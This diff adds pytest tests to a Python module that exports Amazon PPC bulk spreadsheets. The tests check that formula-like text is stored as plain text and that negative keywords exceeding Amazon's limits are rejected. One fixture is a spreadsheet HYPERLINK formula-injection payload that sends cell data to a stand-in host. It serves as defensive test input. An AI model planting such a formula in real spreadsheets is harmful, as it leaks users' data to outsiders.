@@ -23,7 +23,9 @@ Contrato: `.claude/skills/ppc-business-invariants.md` — INV-5.
 from __future__ import annotations
 
 import io
+import zipfile
 
+import openpyxl
 import pandas as pd
 import pytest
 
@@ -31,12 +33,14 @@ from core.bulk_export import (
     _BULK_COLS,
     _BULK_SHEET_NAME,
     _METADATA_SHEET_NAME,
+    NEGATIVE_KEYWORD_TEXT_LIMITS,
     _coerce_str,
     aggregate_str_with_top_campaign,
     build_adgroup_negative,
     build_bid_update,
     build_campaign_negative,
     build_keyword_create,
+    negative_keyword_text_problem,
     write_bulk_excel,
 )
 from core.bulk_parser import validate_bulk
@@ -498,6 +502,65 @@ def test_write_bulk_excel_preserva_el_id_como_texto():
         io.BytesIO(xlsx), sheet_name=_BULK_SHEET_NAME, dtype={"Campaign ID": str}
     )
     assert releido.iloc[0]["Campaign ID"] == CAMPAIGN_ID
+
+
+def test_write_bulk_excel_stores_formula_like_text_as_plain_text():
+    formula_term = '=HYPERLINK("http://example.invalid/?d="&B2,"click")'
+    bulk_df = pd.DataFrame([{column: "" for column in _BULK_COLS} | {"Keyword Text": formula_term,
+                                                                     "Campaign Name": "=1+1"}])
+    metadata_df = pd.DataFrame({"Search Term": [formula_term], "Regla": ["R2"]})
+
+    xlsx = write_bulk_excel(bulk_df, metadata_df)
+
+    workbook = openpyxl.load_workbook(io.BytesIO(xlsx))
+    cells = [cell for sheet in workbook.worksheets for row in sheet.iter_rows() for cell in row]
+    assert [cell.coordinate for cell in cells if cell.data_type == "f"] == []
+    keyword_column = _BULK_COLS.index("Keyword Text") + 1
+    assert workbook[_BULK_SHEET_NAME].cell(row=2, column=keyword_column).value == formula_term
+    assert workbook[_METADATA_SHEET_NAME]["A2"].value == formula_term
+    for sheet_xml in ("xl/worksheets/sheet1.xml", "xl/worksheets/sheet2.xml"):
+        assert "<f>" not in zipfile.ZipFile(io.BytesIO(xlsx)).read(sheet_xml).decode("utf-8")
+
+
+@pytest.mark.parametrize("keyword_text, match_type, fragment", [
+    ("x" * 81, "Negative Exact", "81 caracteres"),
+    ("warm sleeping bag for toddler", "Negative Phrase", "5 palabras"),
+    ("one two three four five six seven eight nine ten eleven", "Negative Exact", "11 palabras"),
+    ("100% cotton", "Negative Exact", "«%»"),
+    ("tog 1/2", "Negative Phrase", "«/»"),
+    ("safe?", "Negative Exact", "«?»"),
+    ("a`b", "Negative Exact", "«`»"),
+    ("a\\b", "Negative Exact", "«\\»"),
+    ("=sum(a1)", "Negative Exact", "«=»"),
+])
+def test_negative_keyword_text_problem_names_what_amazon_rejects(keyword_text, match_type, fragment):
+    assert fragment in negative_keyword_text_problem(keyword_text, match_type)
+
+
+@pytest.mark.parametrize("keyword_text, match_type", [
+    ("x" * 80, "Negative Exact"),
+    ("warm sleeping bag toddler", "Negative Phrase"),
+    ("one two three four five six seven eight nine ten", "Negative Exact"),
+    ("mac & cheese", "Negative Phrase"),
+    ("zapatos-rojos 2.5 tog", "Negative Exact"),
+])
+def test_negative_keyword_text_problem_accepts_text_within_the_limits(keyword_text, match_type):
+    assert negative_keyword_text_problem(keyword_text, match_type) is None
+
+
+def test_negative_keyword_limits_are_one_shared_constant():
+    assert NEGATIVE_KEYWORD_TEXT_LIMITS.max_characters == 80
+    assert dict(NEGATIVE_KEYWORD_TEXT_LIMITS.max_words_by_match_type) == {"Negative Phrase": 4, "Negative Exact": 10}
+
+
+@pytest.mark.parametrize("constructor, row", [(build_adgroup_negative, _agneg), (build_campaign_negative, _cneg)],
+                         ids=["adgroup_negative", "campaign_negative"])
+def test_negative_builders_move_keyword_text_amazon_rejects_to_invalid(constructor, row):
+    bulk_df, invalid_df = constructor([row(keyword_text="100% algodon"), row(keyword_text="algodon organico")])
+
+    assert list(bulk_df["Keyword Text"]) == ["algodon organico"]
+    assert len(invalid_df) == 1
+    assert "«%»" in invalid_df.iloc[0]["_invalid_reason"]
 
 
 # ---------------------------------------------------------------------
